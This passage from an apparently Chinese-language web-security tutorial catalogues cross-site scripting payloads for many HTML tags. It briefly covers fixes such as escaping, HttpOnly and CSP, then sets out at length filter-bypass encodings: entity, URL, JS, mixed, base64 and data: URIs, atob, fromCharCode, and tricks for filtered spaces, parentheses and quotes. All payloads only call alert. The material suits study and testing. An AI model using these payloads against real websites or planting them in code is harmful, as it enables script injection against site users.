<h3 id="0x05-lt-video-gt-标签"><a href="#0x05-lt-video-gt-标签" class="headerlink" title="0x05. &lt; video&gt;标签"></a>0x05. &lt; video&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x06-lt-svg-gt-标签"><a href="#0x06-lt-svg-gt-标签" class="headerlink" title="0x06. &lt; svg&gt; 标签"></a>0x06. &lt; svg&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x07-lt-button-gt-标签"><a href="#0x07-lt-button-gt-标签" class="headerlink" title="0x07. &lt; button&gt; 标签"></a>0x07. &lt; button&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x08-lt-div-gt-标签"><a href="#0x08-lt-div-gt-标签" class="headerlink" title="0x08. &lt; div&gt;标签"></a>0x08. &lt; div&gt;标签</h3><p>这个需要借助url编码来实现绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x09-lt-object-gt-标签"><a href="#0x09-lt-object-gt-标签" class="headerlink" title="0x09. &lt; object&gt;标签"></a>0x09. &lt; object&gt;标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x10-lt-script-gt-标签"><a href="#0x10-lt-script-gt-标签" class="headerlink" title="0x10. &lt; script&gt; 标签"></a>0x10. &lt; script&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x11-lt-p-gt-标签"><a href="#0x11-lt-p-gt-标签" class="headerlink" title="0x11. &lt; p&gt; 标签"></a>0x11. &lt; p&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x12-lt-input-gt-标签"><a href="#0x12-lt-input-gt-标签" class="headerlink" title="0x12. &lt; input&gt; 标签"></a>0x12. &lt; input&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x13-lt-details-gt-标签"><a href="#0x13-lt-details-gt-标签" class="headerlink" title="0x13. &lt; details&gt;标签"></a>0x13. &lt; details&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x14-lt-select-gt-标签"><a href="#0x14-lt-select-gt-标签" class="headerlink" title="0x14. &lt; select&gt; 标签"></a>0x14. &lt; select&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x15-lt-form-gt-标签"><a href="#0x15-lt-form-gt-标签" class="headerlink" title="0x15. &lt; form&gt; 标签"></a>0x15. &lt; form&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt; </span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt; </span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>



<h3 id="0x16-lt-body-gt-标签"><a href="#0x16-lt-body-gt-标签" class="headerlink" title="0x16. &lt; body&gt; 标签"></a>0x16. &lt; body&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>



<h2 id="6-XSS修复"><a href="#6-XSS修复" class="headerlink" title="6.XSS修复"></a>6.XSS修复</h2><h3 id="过滤危险字符"><a href="#过滤危险字符" class="headerlink" title="过滤危险字符"></a>过滤危险字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">转义&amp; &lt;&gt; &quot; &#x27; \ 等危险字符</span><br><span class="line">自定义过滤函数引用</span><br></pre></td></tr></table></figure>



<h3 id="HTTP-only"><a href="#HTTP-only" class="headerlink" title="HTTP-only"></a>HTTP-only</h3><p><a href="https://www.php.cn/php-ask-457831.html">https://www.php.cn/php-ask-457831.html</a></p>
<p>php.ini设置或代码引用</p>
<p>session.cookie_httponly &#x3D;1</p>
<p>ini_set(“session.cookie_httponly”, 1);</p>
<h3 id="设置CSP-Content-Security-Policy"><a href="#设置CSP-Content-Security-Policy" class="headerlink" title="设置CSP(Content Security Policy)"></a>设置CSP(Content Security Policy)</h3><p><a href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a></p>
<p>header(“Content-Security-Policy:img-src ‘self’ “);</p>
<h3 id="输入内容长度限制，实体转义等"><a href="#输入内容长度限制，实体转义等" class="headerlink" title="输入内容长度限制，实体转义等"></a>输入内容长度限制，实体转义等</h3><p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，</strong></p>
<p><strong>所以可以编码方式进行组合绕过。</strong></p>
<p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p>
<h2 id="XSS-过滤绕过"><a href="#XSS-过滤绕过" class="headerlink" title="XSS 过滤绕过"></a>XSS 过滤绕过</h2><p>编码&#x2F;&#x2F;标点符号&#x2F;&#x2F;关键字(大小写&#x2F;双写…..)</p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>浏览器对 XSS 代码的解析顺序为：<strong>HTML解码 —— URL解码 —— JS解码(只支持UNICODE)</strong>—&gt;”<a>XXXX</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">浏览器</span><br><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">--》&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>编码：javascript:alert(1)–》js编码–》url(javascript:%61%6c%65%72%74%28%31%29)–&gt;html()–&gt;paload					</p>
<p>解码–》html–&gt;url–&gt;js–&gt;得到结果进行网页显示</p>
<h4 id="0x01-html-实体编码"><a href="#0x01-html-实体编码" class="headerlink" title="0x01. html 实体编码"></a>0x01. html 实体编码</h4><p><strong>当可控点为单个标签属性时，可以使用 html 实体编码。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;iframe&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;可控点&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>十进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>十六进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>可以不带分号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>可以填充0</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-url-编码"><a href="#0x02-url-编码" class="headerlink" title="0x02. url 编码"></a>0x02. url 编码</h4><p><strong>当注入点存在 href 或者 src 属性时，可以使用 url 编码。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>可以二次编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>





<h4 id="0x03-js-编码"><a href="#0x03-js-编码" class="headerlink" title="0x03. js 编码"></a>0x03. js 编码</h4><p><strong>解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，</strong></p>
<p><strong>例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。</strong></p>
<p><strong>但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</strong></p>
<p><strong>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</strong></p>
<p><strong>js 编码策略：</strong></p>
<ol>
<li>“&quot; 加上三个八进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\074”</li>
<li>“\x” 加上两个十六进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\x3c”</li>
<li>“\u” 加上四个十六进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\u003c”</li>
<li>对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;可控点&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;可控点&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;alert(1)&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>

<p><strong>Unicode 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>

<p><strong>注：</strong></p>
<p><strong>Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。</strong></p>
<p><strong>例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 “1” 进行编码，框号编码后会被当成文本字符，不能执行。</strong></p>
<p>ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。</p>
<p>例如 </p>
<p>eval(“alert(1)”)，可以对 “alert(1)” 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。**</p>
<p><strong>八进制和十六进制</strong></p>
<p>setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。</p>
<p>语法：<code>setTimeout(要执行的代码, 等待的毫秒数)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(JavaScript 函数, 等待的毫秒数)</span><br><span class="line">1.&lt;svg/onload=setTimeout(&#x27;\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;)&gt;</span><br><span class="line">2.&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\050\061\051&#x27;)&gt;</span><br><span class="line">3.&lt;svg/onload=setTimeout(&#x27;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&#x27;)&gt;</span><br><span class="line">4.&lt;script&gt;eval(&quot;\x61\x6C\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br><span class="line">5.&lt;script&gt;eval(&quot;\141\154\145\162\164\050\061\051&quot;)&lt;/script&gt;</span><br><span class="line">6.&lt;script&gt;eval(&quot;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>







<h4 id="0x04-混合编码"><a href="#0x04-混合编码" class="headerlink" title="0x04. 混合编码"></a>0x04. 混合编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>html 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Unicode 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注：Unicode 编码不能对括号使用</strong></p>
<p><strong>url 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 原代码</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">2. 对alert进行JS编码（unicode编码）</span><br><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码</span><br><span class="line">&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：</span><br><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p>
<h4 id="0x05-base64-编码"><a href="#0x05-base64-编码" class="headerlink" title="0x05. base64 编码"></a>0x05. base64 编码</h4><p><strong>base64 编码通常需要使用到 data 伪协议。</strong></p>
<p><strong>data 协议使用方法：<code>data:资源类型;编码,内容</code></strong></p>
<p>base64编码内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</span><br></pre></td></tr></table></figure>

<p>通常与 base64 编码配合 data 协议的标签有 <strong><object>、<a>、<iframe></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&lt;object&gt; 标签</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">2.&lt;a&gt; 标签</span><br><span class="line">&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）</span><br><span class="line"></span><br><span class="line">3.&lt;iframe&gt; 标签</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">4.&lt;embed&gt; 标签</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure>

<p><strong>atob 函数</strong></p>
<p>atob() 方法用于解码使用 base-64 编码的字符串。</p>
<p>语法：<code>window.atob(encodedStr)</code>(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&lt;a href=javascript:eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line">2.&lt;a href=javascript:eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line">3.&lt;a href=javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">4.&lt;img src=x onmouseover=&quot;eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br><span class="line">5.&lt;img src=x onerror=&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br><span class="line">6.&lt;iframe src=&quot;javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>





<h4 id="0x06-ascii-编码"><a href="#0x06-ascii-编码" class="headerlink" title="0x06. ascii 编码"></a>0x06. ascii 编码</h4><p>ascii 编码一般配合<code>String.fromCharCode</code>使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(1)xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">十进制：97, 108, 101, 114, 116, 40, 49, 41</span><br><span class="line">十六进制：0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29</span><br></pre></td></tr></table></figure>

<p><strong>十进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&#x27;javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>十六进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&#x27;javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>







<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><html><img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**></html>

<p>A位置可填充 &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20 </p>
<p>B位置可填充 %09，%0A，%0C，%0D，%20 </p>
<p>C位置可填充 %0B，&#x2F;**&#x2F;，</p>
<p>如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20</p>
<p> D位置可填充 %09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
<h3 id="圆括号过滤绕过"><a href="#圆括号过滤绕过" class="headerlink" title="圆括号过滤绕过"></a>圆括号过滤绕过</h3><h4 id="0x01-反引号替换"><a href="#0x01-反引号替换" class="headerlink" title="0x01. 反引号替换"></a>0x01. 反引号替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-throw-绕过"><a href="#0x02-throw-绕过" class="headerlink" title="0x02. throw 绕过"></a>0x02. throw 绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</span><br><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h3><h4 id="0x01-斜杠替换"><a href="#0x01-斜杠替换" class="headerlink" title="0x01. 斜杠替换"></a>0x01. 斜杠替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

